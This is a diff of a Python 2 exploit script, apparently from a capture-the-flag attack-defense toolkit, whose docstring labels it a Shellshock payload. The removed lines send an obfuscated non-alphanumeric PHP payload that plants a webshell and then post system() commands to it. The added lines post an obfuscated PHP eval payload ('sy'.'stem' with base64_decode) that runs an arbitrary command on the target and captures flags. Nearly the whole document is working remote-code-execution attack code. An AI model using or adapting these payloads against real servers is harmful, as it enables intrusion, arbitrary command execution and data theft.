@@ -3,6 +3,7 @@
 from http import http
 from config import *
 from function import *
+import urllib
 
 '''
 this is the payload script for vuln shellshock
@@ -10,33 +11,31 @@ this is the payload script for vuln shellshock
 '''
 
 
-def attack(target,cmd,get_flag):
+def attack(target,target_port,cmd,get_flag):
     is_vuln = 1
     flag = "hello world!"
     info = "success"
     reserve = 0    
-    if check_shell(target,""):
-	res = execute_shell(target,cmd)
+
+    if check_shell(target,target_port,""):
+	res = execute_shell(target,target_port,cmd)
     else:
 	dump_warning(target,"check_shell failed","function.py check_shell")
-    try:
-	res = http('get',target,target_port,"/?content=$_='';$_[%2b$_]%2b%2b;$_=$_.'';$__=$_[%2b''];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____='_';$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]);",'',{})
-	print res 
-    except Exception,e:
-	dump_error(target,"attack failed","sample.py attack")
-	res = "error"
+	'''
 	
-    index_1 = res.find("href='") + 6
-    index_2 = res.find("'>shell")
-    shell_url = "/" + res[index_1:index_2]	
-    print "[*]shell_url => " + shell_url
-    try:	    
-	data = "_=system('" + cmd + "')"
-	res = http("post",target,target_port,shell_url,data,{})
-	print len(res)
-    except Exception,e:
-	dump_error(target,"attack failed","sample.py attack")
-	res = "error"
+	'''
+	try:	   
+	    cmd = urllib.unquote(cmd) 
+	    cmd = base64.b64encode(cmd)
+            if debug:
+	        print cmd
+	    data = "<?php $a='sy'.'stem';$b = '%s';$a(base64_decode($b));?>"%cmd
+	    res = http("post",target,target_port,"/index.php?f=a",data,headers)
+        except Exception,e:
+	    print e
+	    dump_error(target,"attack failed","sample.py attack")
+	    res = "error"
+
     if get_flag:
 	if check_flag(res):
 	    flag = res
@@ -47,11 +46,7 @@ def attack(target,cmd,get_flag):
 	pass
     else:
 	dump_success(target,"execution cmd","sample.py")
-	if len(res)<200:
-    	    print res
-	else:
-	    print res[:200]
-
+        print res_filter(res)
 
     print "testing ..........."
     return flag,is_vuln,info,reserve 
